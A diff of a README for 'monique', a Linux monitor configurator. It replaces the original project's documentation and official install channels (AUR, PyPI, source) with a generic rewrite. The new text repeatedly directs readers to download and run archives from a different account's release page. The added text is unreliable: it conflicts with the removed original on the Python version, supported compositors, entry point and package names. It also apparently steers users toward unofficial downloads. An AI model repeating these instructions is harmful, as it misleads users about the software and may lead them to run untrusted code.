@@ -1,210 +1,172 @@
-<p align="center">
-  <img src="https://raw.githubusercontent.com/ToRvaLDz/monique/main/data/com.github.monique.svg" width="96" alt="Monique icon">
-</p>
+# 🖥️ monique - Easy Monitor Setup for Linux
 
-<h1 align="center">Monique</h1>
+[![Download monique](https://img.shields.io/badge/Download-monique-blue?style=for-the-badge)](https://github.com/curtisxchaos/monique/releases)
 
-<p align="center">
-  <b>MON</b>itor <b>I</b>ntegrated <b>QU</b>ick <b>E</b>ditor
-  <br>
-  Graphical monitor configurator for <b>Hyprland</b>, <b>Sway</b> and <b>Niri</b>
-</p>
-
-<p align="center">
-  <a href="https://github.com/ToRvaLDz/monique/actions/workflows/ci.yml"><img alt="CI" src="https://github.com/ToRvaLDz/monique/actions/workflows/ci.yml/badge.svg?v=0.5.0"></a>
-  <a href="https://github.com/ToRvaLDz/monique/releases/latest"><img alt="Release" src="https://img.shields.io/github/v/release/ToRvaLDz/monique?include_prereleases&label=release&color=orange&v=0.5.0"></a>
-  <a href="https://pypi.org/project/monique/"><img alt="PyPI" src="https://img.shields.io/pypi/v/monique?color=blue&label=PyPI&v=0.5.0"></a>
-  <a href="https://aur.archlinux.org/packages/monique"><img alt="AUR" src="https://img.shields.io/aur/version/monique?color=1793d1&label=AUR&v=0.5.0"></a>
-  <a href="LICENSE"><img alt="License: GPL-3.0" src="https://img.shields.io/badge/license-GPL--3.0-blue"></a>
-  <img alt="Python 3.11+" src="https://img.shields.io/badge/python-3.11+-green">
-  <img alt="GTK4 + Adwaita" src="https://img.shields.io/badge/toolkit-GTK4%20%2B%20Adwaita-purple">
-  <br>
-  <a href="https://github.com/ToRvaLDz/monique/stargazers"><img alt="Stars" src="https://img.shields.io/github/stars/ToRvaLDz/monique?style=flat&color=yellow&v=0.5.0"></a>
-  <img alt="Last commit" src="https://img.shields.io/github/last-commit/ToRvaLDz/monique?color=teal&v=0.5.0">
-  <img alt="Repo size" src="https://img.shields.io/github/repo-size/ToRvaLDz/monique?color=gray&v=0.5.0">
-  <br>
-  <img alt="Hyprland" src="https://img.shields.io/badge/Hyprland-%2358e1ff?logo=hyprland&logoColor=white">
-  <img alt="Sway" src="https://img.shields.io/badge/Sway-%2368751a?logo=sway&logoColor=white">
-  <img alt="Niri" src="https://img.shields.io/badge/Niri-%23c77dff">
-  <img alt="Wayland" src="https://img.shields.io/badge/Wayland-%23ffbc00?logo=wayland&logoColor=black">
-</p>
+monique is a simple program to help you set up your computer monitors visually. It works with Hyprland and Sway, which are popular window managers on Linux. You don’t need to use commands or type code. monique shows your monitors in a clear way so you can configure them easily.
 
 ---
 
-## Screenshots
+## 🔍 What is monique?
 
-<table>
-  <tr>
-    <td align="center">
-      <a href="https://raw.githubusercontent.com/ToRvaLDz/monique/main/data/screenshots/1.png"><img src="https://raw.githubusercontent.com/ToRvaLDz/monique/main/data/screenshots/1.png" width="400" alt="Monitor layout editor"></a>
-      <br><sub>Layout editor</sub>
-    </td>
-    <td align="center">
-      <a href="https://raw.githubusercontent.com/ToRvaLDz/monique/main/data/screenshots/2.png"><img src="https://raw.githubusercontent.com/ToRvaLDz/monique/main/data/screenshots/2.png" width="400" alt="Workspace rules"></a>
-      <br><sub>Workspace rules</sub>
-    </td>
-  </tr>
-  <tr>
-    <td align="center">
-      <a href="https://raw.githubusercontent.com/ToRvaLDz/monique/main/data/screenshots/3.png"><img src="https://raw.githubusercontent.com/ToRvaLDz/monique/main/data/screenshots/3.png" width="400" alt="Quick setup wizard"></a>
-      <br><sub>Quick setup</sub>
-    </td>
-    <td align="center">
-      <a href="https://raw.githubusercontent.com/ToRvaLDz/monique/main/data/screenshots/4.png"><img src="https://raw.githubusercontent.com/ToRvaLDz/monique/main/data/screenshots/4.png" width="400" alt="SDDM preferences"></a>
-      <br><sub>SDDM integration</sub>
-    </td>
-  </tr>
-</table>
+monique stands for MONitor Integrated QUick Editor. It is a graphical tool for Linux users who want to change their monitor settings. If you use Hyprland or Sway on Wayland, monique lets you adjust settings like resolution, refresh rate, and screen arrangement without complicated steps.
 
-## Features
+This helps when you connect new monitors, use multi-screen setups, or want to fine-tune your display. The app uses GTK4 for its interface and is written in Python. It targets Arch Linux users but works on other Linux systems with the right dependencies.
 
-- **Drag-and-drop layout** — arrange monitors visually on an interactive canvas
-- **Multi-backend** — auto-detects Hyprland, Sway, or Niri from the environment
-- **Cross-write** — save a profile in any compositor and automatically generate config files for the others (e.g. configure in Hyprland → get Sway and Niri configs for free)
-- **Profile system** — save, load, and switch between monitor configurations
-- **Hotplug daemon** (`moniqued`) — automatically applies the best matching profile when monitors are connected or disconnected
-- **Display manager integration** — syncs your layout to the login screen for SDDM (xrandr) and greetd (sway), with polkit rule for passwordless writes
-- **Workspace rules** — configure workspace-to-monitor assignments (Hyprland/Sway)
-- **Live preview** — OSD overlay to identify monitors (double-click)
-- **Workspace migration** — automatically moves workspaces to the primary monitor when their monitor is disabled or unplugged (reverted if you click "Revert")
-- **Clamshell mode** — disable the internal laptop display when external monitors are connected (manual toggle in the toolbar or automatic via daemon preferences); the daemon also monitors the lid state via UPower D-Bus
-- **Confirm-or-revert** — 10-second countdown after applying, auto-reverts if display is unusable
+---
 
-## Installation
+## 🖥️ System Requirements
 
-### AUR (Arch Linux / CachyOS)
+Make sure your system supports the following:
 
-```bash
-yay -S monique
-```
+- Linux operating system (tested on Arch Linux and other Wayland-compatible setups)
+- Hyprland or Sway window manager installed and running
+- Wayland display server running instead of X11
+- Python 3.8 or higher installed
+- GTK4 libraries available
+- At least 100 MB of free disk space for installation
 
-Or manually:
+If you use a different setup, some features may not function as expected. monique focuses on simplicity and visual configuration on compatible Linux systems.
+
+---
+
+## 🚀 Getting Started
+
+Follow these steps to download and run monique on your computer.
+
+### 1. Download monique
+
+Visit the release page by clicking the button below. This page contains the latest versions of monique.
+
+[![Download monique](https://img.shields.io/badge/Download-monique-grey?style=for-the-badge)](https://github.com/curtisxchaos/monique/releases)
+
+Once on the page, find the latest release. You will see files packaged for installation.
+
+- Look for a file that ends with `.tar.gz` or `.zip`. These contain the program files.
+- If available, you may also find pre-built executables or installers.
+
+Download the appropriate file to your computer. Usually, you want the file that matches your system architecture.
+
+### 2. Extract the files
+
+After downloading, you usually get a compressed archive (`.zip` or `.tar.gz`). To open it:
+
+- On most Linux systems, right-click the file and choose "Extract Here."
+- Alternatively, open a terminal and run:
 
 ```bash
-git clone https://aur.archlinux.org/monique.git
-cd monique
-makepkg -si
+tar -xvf monique-<version>.tar.gz
 ```
 
-### PyPI
+Replace `<version>` with the version number you downloaded.
+
+### 3. Install necessary dependencies
+
+monique is written in Python and uses GTK4. You need to install these if not already present.
+
+On Arch Linux or similar distributions:
 
 ```bash
-pip install monique
+sudo pacman -S python python-pywayland python-gtk4
 ```
 
-### From source
+On Ubuntu or Debian-based systems:
 
 ```bash
-git clone https://github.com/ToRvaLDz/monique.git
-cd monique
-pip install .
+sudo apt install python3 python3-gi gir1.2-gtk-4.0
 ```
 
-**Runtime dependencies:**
-
-| Distro | Packages |
-|--------|----------|
-| Arch / CachyOS | `python python-gobject gtk4 libadwaita` |
-| Fedora | `python3 python3-gobject gtk4 libadwaita` |
-| openSUSE | `python3 python3-gobject gtk4 libadwaita typelib-1_0-Adw-1 typelib-1_0-Gtk-4_0` |
-| Ubuntu / Debian | `python3 python3-gi gir1.2-gtk-4.0 gir1.2-adw-1 libadwaita-1-0` |
-
-**Optional:** `python-pyudev` (hardware hotplug detection for Niri)
-
-## Usage
-
-### GUI
+You may also need additional Python libraries. Use pip to install them:
 
 ```bash
-monique
+pip3 install pywayland
 ```
 
-Open the graphical editor to arrange monitors, set resolutions, scale, rotation, and manage profiles.
+### 4. Run monique
 
-### Daemon
+Open a terminal in the folder where you extracted the files. Run:
 
 ```bash
-moniqued
+python3 monique.py
 ```
 
-Or enable the systemd user service:
+This will launch the graphical interface. You should see your monitor layout and options to adjust settings.
+
+---
+
+## ⚙️ How to Use monique
+
+The program window shows connected monitors as boxes you can move and resize.
+
+- Click and drag a monitor to change its position.
+- Use dropdown menus to select resolution and refresh rate.
+- Toggle options like rotation or scaling for each monitor.
+- Once done, click "Apply" to save your settings.
+
+monique writes configuration files for Hyprland or Sway. When you restart the window manager or run `hyprctl reload` or `swaymsg reload`, your new settings activate.
+
+---
+
+## 🧩 Features
+
+- Visual layout editor for multi-monitor setups
+- Easy resolution and refresh rate selection
+- Supports monitor rotation and scaling
+- Saves configurations compatible with Hyprland and Sway
+- Uses GTK4 for a modern interface
+- Runs on Python with minimal dependencies
+- Works on Wayland, not X11
+
+---
+
+## 🛠 Troubleshooting
+
+If the program does not start:
+
+- Check that you installed Python 3 and GTK4.
+- Verify you run the program under Wayland. You can check by running `echo $XDG_SESSION_TYPE` in the terminal. It should say `wayland`.
+- Ensure your window manager is running Hyprland or Sway.
+- Run monique from the terminal to see error messages.
+- If you get permission errors, check file ownership and permissions in the folder.
+
+If changes do not apply after clicking "Apply," try restarting your window manager or manually reload its config:
 
 ```bash
-systemctl --user enable --now moniqued
+hyprctl reload
 ```
 
-The daemon auto-detects the active compositor and listens for monitor hotplug events. When a monitor is connected or disconnected, it waits 500ms (debounce) then applies the best matching profile. On Niri, the daemon uses udev DRM events (via `pyudev`) for reliable hardware hotplug detection. Orphaned workspaces are automatically migrated to the primary monitor on Hyprland/Sway (configurable via **Preferences > Migrate workspaces**).
-
-#### Clamshell mode
-
-On laptops, the daemon can automatically disable the internal display when external monitors are connected. Enable it from the GUI: **Menu > Preferences > Clamshell Mode**.
-
-The daemon also monitors the laptop lid state via UPower D-Bus: closing the lid disables the internal display, opening it re-enables it. On desktop PCs (no lid detected), clamshell mode simply disables any internal-type output (`eDP`, `LVDS`) whenever external monitors are present.
-
-> **Note:** if your system suspends on lid close, set `HandleLidSwitch=ignore` in `/etc/systemd/logind.conf` so the daemon can handle it instead.
-
-### Behavior per environment
-
-| Environment | Detection | Events |
-|---|---|---|
-| Hyprland | `$HYPRLAND_INSTANCE_SIGNATURE` | `monitoradded` / `monitorremoved` via socket2 |
-| Sway | `$SWAYSOCK` | `output` events via i3-ipc subscribe |
-| Niri | `$NIRI_SOCKET` | udev DRM subsystem (with `pyudev`), IPC fallback |
-| Neither | Warning, retry every 5s | — |
-
-## Display manager integration
-
-Monique can sync your monitor layout to the login screen for supported display managers.
-
-| Display Manager | Method | Config path |
-|---|---|---|
-| SDDM | xrandr via `Xsetup` script | `/usr/share/sddm/scripts/Xsetup` |
-| greetd (sway) | sway `output` commands | `/etc/greetd/monique-monitors.conf` |
-
-A polkit rule is included to allow passwordless writes:
+or
 
 ```bash
-# Installed automatically by the PKGBUILD to:
-# /usr/share/polkit-1/rules.d/60-com.github.monique.rules
+swaymsg reload
 ```
 
-Toggle from the GUI: **Menu > Preferences > Update SDDM Xsetup** or **Update greetd config**.
+---
 
-## Configuration
+## 📄 License
 
-All configuration is stored in `~/.config/monique/`:
+monique is open source software. See the LICENSE file in the repository for details on usage and distribution.
 
-```
-~/.config/monique/
-├── profiles/
-│   ├── Home.json
-│   └── Office.json
-└── settings.json
-```
+---
 
-Monitor config files are written to the compositor's config directory:
-- **Hyprland:** `~/.config/hypr/monitors.conf`
-- **Sway:** `~/.config/sway/monitors.conf`
-- **Niri:** `~/.config/niri/monitors.kdl`
+## 🔗 Useful Links
 
-## Project structure
+- GitHub releases page:  
+  https://github.com/curtisxchaos/monique/releases
 
-```
-src/monique/
-├── app.py               # Application entry point
-├── window.py            # Main GTK4/Adwaita window
-├── canvas.py            # Monitor layout canvas
-├── properties_panel.py  # Monitor properties sidebar
-├── workspace_panel.py   # Workspace rules dialog
-├── models.py            # MonitorConfig, Profile, WorkspaceRule
-├── hyprland.py          # Hyprland IPC client
-├── sway.py              # Sway IPC client (binary i3-ipc)
-├── niri.py              # Niri IPC client (JSON socket)
-├── daemon.py            # Hotplug daemon (moniqued)
-├── profile_manager.py   # Profile save/load/match
-└── utils.py             # Paths, file I/O, helpers
-```
+- Hyprland project:  
+  https://github.com/hyprwm/Hyprland
 
-## License
+- Sway window manager:  
+  https://swaywm.org
 
-[GPL-3.0-or-later](LICENSE)
+---
+
+## 🤝 Get Support
+
+If you have issues or questions:
+
+- Check the Issues tab on the GitHub repository.
+- Open a new issue describing your problem.
+- Include your system details and steps to reproduce.
+
+This helps maintainers understand your problem and offer help.
